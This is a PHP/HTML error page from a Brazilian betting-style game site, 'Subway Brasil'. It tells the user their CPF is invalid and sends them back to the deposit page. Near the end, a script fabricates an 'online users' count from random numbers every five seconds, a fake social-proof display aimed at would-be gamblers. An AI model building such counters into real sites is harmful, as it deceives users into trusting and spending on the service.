<?php
session_start(); ?>




<?php
// Iniciar ou resumir a sessão
session_start();

// Obtém o email da sessão
$email = $_SESSION['email'];
$saldo = 1;
?>




<!DOCTYPE html>


<html lang="pt-br" class="w-mod-js w-mod-ix wf-spacemono-n4-active wf-spacemono-n7-active wf-active">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        .wf-force-outline-none[tabindex="-1"]:focus {
            outline: none;
        }
    </style>
    <meta charset="pt-br">
    <title>Obrigado - Subway Brasil </title>
    
    <meta content="Obrigado - Subway Brasil" property="og:title">
    

    <meta content="width=device-width, initial-scale=1" name="viewport">

<meta content="Subway Brasil não depende sorte, somente habilidade. Jogue rodadas grátis e concentre-se em desviar dos obstáculos para completar o percurso." name="description" />
<meta property="og:image" content="https://subwaybrasil.bet/img/SubwayLogo.webp" />
<meta property="og:url" content="https://subwaybrasil.bet/">
<meta content="Subway Brasil" property="og:title" />
<meta content="Subway Brasil não depende sorte, somente habilidade. Jogue rodadas grátis e concentre-se em desviar dos obstáculos para completar o percurso." property="og:description" />
<meta name="twitter:site" content="@subwaybrasil" />
<meta name="twitter:image" content="https://subwaybrasil.bet/img/SubwayLogo.webp" />
<meta content="Subway Brasil" property="twitter:title" />
<meta content="Subway Brasil não depende sorte, somente habilidade. Jogue rodadas grátis e concentre-se em desviar dos obstáculos para completar o percurso." property="twitter:description" />
<meta property="og:type" content="website" />
    <link href="../arquivos/page.css" rel="stylesheet" type="text/css">



    <script type="text/javascript">
        WebFont.load({
            google: {
                families: ["Space Mono:regular,700"]
            }
        });
    </script>




    <link rel="apple-touch-icon" sizes="180x180" href="../img/logo.webp">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/logo.webp">
    <link rel="icon" type="image/png" sizes="16x16" href="../img/logo.webp">


    <link rel="icon" type="image/x-icon" href="../img/logo.webp">


    <link rel="stylesheet" href="../arquivos/css" media="all">

<?php
        include '../pixels.php';
        ?>
</head>

<body>

<?php
        include '../pixels.php';
        ?>



    <div>


        <section id="hero" class="hero-section dark wf-section">

            <style>
                div.escudo {
                    display: block;
                    width: 247px;
                    line-height: 65px;
                    font-size: 12px;
                    margin: -60px 0 0 0;
                    background-image: url(./arquivos/escudo-branco.webp);
                    background-size: contain;
                    background-repeat: no-repeat;
                    background-position: center;
                    filter: drop-shadow(1px 1px 3px #00000099) hue-rotate(0deg);
                }

                div.escudo img {
                    width: 43px;
                    /*margin: -10px 6px 0 0;*/
                }
                
                .cadastro-btn {
    background-color: #af0303 !important;
                }

            </style>

            <div class="minting-container w-container" style="margin-top: -20%">
                <div class="escudo">
                    <img src="arquivos/close1.webp">
                </div>
                <a style="color: red;"><h2>ERRO!</a> <br>O CPF ESTÁ INVÁLIDO!</br> </h2>
                <p ><strong>Ops, parece que o <a style="color: red;"><b>CPF inserido não é válido</b></a>. Por favor, verifique se todos os números foram digitados corretamente e tente novamente. Se precisar de ajuda, estamos à disposição para auxiliá-lo.
                    </strong>
                </p>
                <strong style="margin-top: 20px">👇 Clique no Botão Abaixo 👇️️️</strong>

                <a href="../deposito/" class="cadastro-btn">TENTAR NOVAMENTE</a>

                <style>
                    .win-warn {
                        color: #22C55E;
                    }

                    .cadastro-btn {
                        display: inline-block;
                        margin-top: 20px;
                        padding: 16px 40px;
                        border-style: solid;
                        border-width: 4px;
                        border-color: #1f2024;
                        border-radius: 8px;
                        background-color: #1fbffe;
                        box-shadow: -3px 3px 0 0 #1f2024;
                        -webkit-transition: background-color 200ms ease, box-shadow 200ms ease, -webkit-transform 200ms ease;
                        transition: background-color 200ms ease, box-shadow 200ms ease, -webkit-transform 200ms ease;
                        transition: background-color 200ms ease, transform 200ms ease, box-shadow 200ms ease;
                        transition: background-color 200ms ease, transform 200ms ease, box-shadow 200ms ease, -webkit-transform 200ms ease;
                        font-family: right grotesk, sans-serif;
                        color: #fff;
                        font-size: 1.25em;
                        text-align: center;
                        letter-spacing: .12em;
                        cursor: pointer;
                    }
                    
                    .hero-section {
    background-image: url(https://subwaybrasil.bet/arquivos/background.webp);
    background-size: cover !important;
    background-repeat: no-repeat;
    height: 90vh;
}
                </style>

            </div>


            <div id="wins" style="
    display: block;
    width: 240px;
    font-size: 12px;
    padding: 5px 0;
    text-align: center;
    line-height: 13px;
    background-color: #FFC107;
    border-radius: 10px;
    border: 3px solid #1f2024;
    box-shadow: -3px 3px 0 0px #1f2024;
    margin: -24px auto 0 auto;
    z-index: 1000;
">
    <span id="username1"></span><br>
    Usuários online: <span id="valorAposta1"></span><br>
    &nbsp;
</div>

<script>
    var currentIndex = 0;
        var baseValue = 1362; // Valor base para os usuários online
    var variation = 300; // Variação máxima

    function updateWins() {
        var usernameSpan = document.getElementById("username1");
        var valorApostaSpan = document.getElementById("valorAposta1");

        // Gere um valor aleatório dentro da variação em torno do valor base
        var valorAposta = baseValue + Math.floor(Math.random() * (2 * variation + 1)) - variation;

        // Atualize os elementos HTML com os valores gerados
        valorApostaSpan.innerText = valorAposta;

        currentIndex++;

        // Se chegarmos ao valor máximo, reinicie o índice
        if (currentIndex > 25000) {
            currentIndex = 0;
        }
    }

    // Chama a função de atualização da div "wins" a cada 30 segundos (30000 milissegundos)
    setInterval(updateWins, 5000);

    // Chama a função pela primeira vez para exibir os primeiros dados
    updateWins();
</script>



        </section>

        <div style="visibility: visible;">
            <div></div>
            <div>
                <div
                    style="display: flex; flex-direction: column; z-index: 999999; bottom: 88px; position: fixed; right: 16px; direction: ltr; align-items: end; gap: 8px;">
                    <div style="display: flex; gap: 8px;"></div>
                </div>
                <style>
                    @-webkit-keyframes ww-c5d711d7-9084-48ed-a561-d5b5f32aa3a5-launcherOnOpen {
                        0% {
                            -webkit-transform: translateY(0px) rotate(0deg);
                            transform: translateY(0px) rotate(0deg);
                        }

                        30% {
                            -webkit-transform: translateY(-5px) rotate(2deg);
                            transform: translateY(-5px) rotate(2deg);
                        }

                        60% {
                            -webkit-transform: translateY(0px) rotate(0deg);
                            transform: translateY(0px) rotate(0deg);
                        }


                        90% {
                            -webkit-transform: translateY(-1px) rotate(0deg);
                            transform: translateY(-1px) rotate(0deg);

                        }

                        100% {
                            -webkit-transform: translateY(-0px) rotate(0deg);
                            transform: translateY(-0px) rotate(0deg);
                        }
                    }

                    @keyframes ww-c5d711d7-9084-48ed-a561-d5b5f32aa3a5-launcherOnOpen {
                        0% {
                            -webkit-transform: translateY(0px) rotate(0deg);
                            transform: translateY(0px) rotate(0deg);
                        }

                        30% {
                            -webkit-transform: translateY(-5px) rotate(2deg);
                            transform: translateY(-5px) rotate(2deg);
                        }

                        60% {
                            -webkit-transform: translateY(0px) rotate(0deg);
                            transform: translateY(0px) rotate(0deg);
                        }


                        90% {
                            -webkit-transform: translateY(-1px) rotate(0deg);
                            transform: translateY(-1px) rotate(0deg);

                        }

                        100% {
                            -webkit-transform: translateY(-0px) rotate(0deg);
                            transform: translateY(-0px) rotate(0deg);
                        }
                    }

                    @keyframes ww-c5d711d7-9084-48ed-a561-d5b5f32aa3a5-widgetOnLoad {
                        0% {
                            opacity: 0;
                        }

                        100% {
                            opacity: 1;
                        }
                    }

                    @-webkit-keyframes ww-c5d711d7-9084-48ed-a561-d5b5f32aa3a5-widgetOnLoad {
                        0% {
                            opacity: 0;
                        }

                        100% {
                            opacity: 1;
                        }
                    }

                    </st></div></div></body></html>
